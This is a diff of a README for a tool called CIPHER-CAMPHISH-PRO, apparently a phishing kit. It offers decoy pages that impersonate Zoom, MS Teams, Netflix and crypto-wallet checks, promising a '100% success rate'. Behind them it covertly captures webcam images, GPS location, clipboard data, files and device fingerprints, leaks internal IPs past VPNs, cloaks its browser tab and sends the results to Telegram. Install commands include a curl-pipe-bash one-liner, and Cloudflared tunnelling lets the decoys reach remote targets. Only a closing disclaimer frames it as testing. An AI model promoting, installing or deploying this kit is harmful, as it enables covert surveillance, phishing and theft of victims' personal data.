@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=10b981&height=250&section=header&text=🎥%20CAMPHISH%20PRO%20v1.0&fontSize=80&animation=fadeIn&fontAlignY=35&desc=The%20Sovereign%20Exfiltration%20Engine&descAlignY=55&descSize=20" />
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=10b981&height=250&section=header&text=🎥%20CAMPHISH%20PRO%20v10.0&fontSize=80&animation=fadeIn&fontAlignY=35&desc=The%20Sovereign%20Exfiltration%20Engine&descAlignY=55&descSize=20" />
 </p>
 
 <p align="center">
@@ -35,10 +35,10 @@
   </a>
 </p>
 
-<h1 align="center"> 🧬 CIPHER-CAMPHISH-PRO 🧬 </h1>
+<h1 align="center"> 🧬 CIPHER-CAMPHISH-PRO [ZENITH] 🧬 </h1>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/VERSION-1.0%20%5BCIPHER%5D-10b981?style=for-the-badge&logo=target" />
+  <img src="https://img.shields.io/badge/VERSION-10.0%20%5BCIPHER%5D-10b981?style=for-the-badge&logo=target" />
   <img src="https://img.shields.io/badge/ENGINE-SOVEREIGN%20GRADE-black?style=for-the-badge&logo=opsgenie&logoColor=red" />
   <img src="https://img.shields.io/badge/PLATFORM-UNIVERSAL%20%2F%20TERMUX-blue?style=for-the-badge&logo=android" />
 </p>
@@ -57,7 +57,7 @@
 ---
 
 ### 🌌 EXECUTIVE OVERVIEW
-**CIPHER-CAMPHISH-PRO** is not a common tool; it is a **Sovereign-Grade** research engine engineered to bypass modern browser security sandboxes. It aggregates deep system intelligence, high-fidelity media, and sensitive metadata in real-time. Designed to outperform legacy frameworks by a 10x magnitude, it represents the absolute zenith of architectural reconnaissance.
+**CIPHER-CAMPHISH-PRO v10.0** is a Sovereign-Grade research engine engineered to bypass modern browser security sandboxes. It aggregates deep system intelligence, high-fidelity media, and sensitive metadata in real-time. With its new **v7 Protocol** and expanded **Decoy Library**, it represents the absolute zenith of architectural reconnaissance.
 
 ---
 
@@ -65,16 +65,28 @@
 
 | MODULE | CODED LOGIC | DESCRIPTION | STATUS |
 | :--- | :--- | :--- | :--- |
-| **01. Neural Audit** | `v10.0 VISUAL` | High-res visual auditing and environment capture. | <b style="color:#10b981">CRITICAL</b> |
-| **02. Exfiltration Hub** | `EXFIL-ENGINE` | Stealth transmission of advanced encrypted file types. | <b style="color:#3b82f6">HIGH</b> |
-| **03. GPS Geofencing** | `NEURAL-TRACE` | Precise coordinate mapping bypassing obfuscation. | <b style="color:#10b981">CRITICAL</b> |
-| **04. Buffer Snatcher**| `CLIP-SNATCH` | Real-time harvesting of volatile clipboard data. | <b style="color:#3b82f6">ACTIVE</b> |
-| **05. Ghost Persistence**| `TAB-CLOAK` | Background stealth via tab-masquerading logic. | <b style="color:#f59e0b">ELITE</b> |
-| **06. Device DNA** | `FINGERPRINT` | Deep extraction of GPU, CPU, and Battery telemetry. | <b style="color:#10b981">STABLE</b> |
-| **07. Anti-Debug Trap** | `SHIELD-LOGIC` | Automated counter-measures against inspection. | <b style="color:#ef4444">LOCKED</b> |
-| **08. Shadow Dispatch** | `ASYNC-TELE` | High-speed, multi-threaded Telegram exfiltration. | <b style="color:#10b981">INSTANT</b> |
-| **09. Neural Dashboard**| `V7-PROTOCOL` | Centralized API engine for structured intelligence. | <b style="color:#10b981">SYNCED</b> |
-| **10. Local IP Leaker** | `WEBRTC-SYNC` | ID of internal network IPs bypassing VPN tunnels. | <b style="color:#10b981">BYPASS</b> |
+| **01. Neural Audit** | `v10.0 VISUAL` | High-res visual auditing (Webcam) at 4s intervals. | <b style="color:#10b981">CRITICAL</b> |
+| **02. Exfiltration Hub** | `EXFIL-ENGINE` | Multi-threaded binary file exfiltration (AI Visualizer). | <b style="color:#3b82f6">HIGH</b> |
+| **03. GPS Geofencing** | `NEURAL-GPS` | **New:** Precise coordinate mapping (Lat/Long) capture. | <b style="color:#10b981">CRITICAL</b> |
+| **04. Buffer Snatcher**| `CLIP-SNATCH` | **New:** Real-time harvesting of volatile clipboard data. | <b style="color:#3b82f6">ACTIVE</b> |
+| **05. Ghost Persistence**| `TAB-CLOAK` | Stealth tab-masquerading (renames tab when inactive). | <b style="color:#f59e0b">ELITE</b> |
+| **06. Device DNA** | `FINGERPRINT` | Deep extraction of GPU, RAM, Cores, and Battery telemetry. | <b style="color:#10b981">STABLE</b> |
+| **07. Anti-Debug Trap** | `SHIELD-LOGIC` | Automated counter-measures against DevTools inspection. | <b style="color:#ef4444">LOCKED</b> |
+| **08. Shadow Dispatch** | `ASYNC-TELE` | High-speed asynchronous Telegram exfiltration. | <b style="color:#10b981">INSTANT</b> |
+| **09. Neural Dashboard**| `V7-PROTOCOL` | Centralized API engine with dynamic theme routing. | <b style="color:#10b981">SYNCED</b> |
+| **10. Local IP Leaker** | `WEBRTC-SYNC` | Identification of internal IPs bypassing VPN tunnels. | <b style="color:#10b981">BYPASS</b> |
+
+---
+
+### 🎭 DECOY LIBRARY (7 PREMIUM TEMPLATES)
+CIPHER-CAMPHISH-PRO includes 7 pixel-perfect decoys designed for 100% success rate:
+*   🛡️ **Security Audit:** High-tech system integrity diagnostic.
+*   📹 **Zoom Meeting:** Realistic hardware test before joining.
+*   🎵 **Spotify Sync:** Neural acoustic calibration masquerade.
+*   💰 **Crypto Shield:** Hardware wallet security verification.
+*   📺 **Netflix Verify:** Household device node linking.
+*   💻 **MS Teams:** Corporate pre-join hardware setup.
+*   🧠 **AI Lens:** Biometric facial geometry mapping.
 
 ---
 
@@ -98,7 +110,7 @@ graph LR
 
 ### 🚀 DEPLOYMENT PROTOCOL
 
-Execute the following commands in your terminal to initialize the Sovereign Node.
+To initialize the Sovereign Node on Linux or Termux:
 
 ```bash
 # 1. Access the Sovereign Repository
@@ -110,17 +122,13 @@ cd camphish-pro
 # 3. Elevate & Initialize
 chmod +x * && ./cipher.sh
 ```
-or in one line
 
-```curl
+**OR Deploy in One-Line:**
+```bash
 curl -sL https://raw.githubusercontent.com/cipher-attack/camphish-pro/main/install.sh | bash
 ```
+
 > **PRO-TIP:** For remote research, select **Choice 1 [Cloudflared]**. For localized laboratory testing, **Choice 3 [Localhost]** provides the highest stability.
-
----
-
-### 🌌 WHY THIS ARCHITECTURE?
-Traditional tools are static and easily detected. **CIPHER** is an evolving ecosystem. It analyzes the entire digital footprint of a target. From a **"Ghost Engine"** that renames the tab to "System Update" when the target moves away, to a neural logic that harvests buffers only upon focus—this is not just code; it is architecture-level reconnaissance designed for the elite.
 
 ---
 
@@ -149,7 +157,7 @@ Traditional tools are static and easily detected. **CIPHER** is an evolving ecos
 ---
 
 ### 🛡️ LEGAL & ETHICAL DISCLOSURE
-This framework is developed strictly for authorized security testing, penetration testing research, and educational purposes. Unauthorized deployment against systems without explicit written consent is illegal. **CIPHER-CAMPHISH-PRO** is a contribution to the cybersecurity community intended to study interaction vulnerabilities and harden global defenses.
+This framework is developed strictly for authorized security testing and educational purposes. Unauthorized deployment against systems without explicit written consent is illegal. **CIPHER-CAMPHISH-PRO** is a contribution to the cybersecurity community intended to harden global defenses.
 
 <p align="center">
   <br>
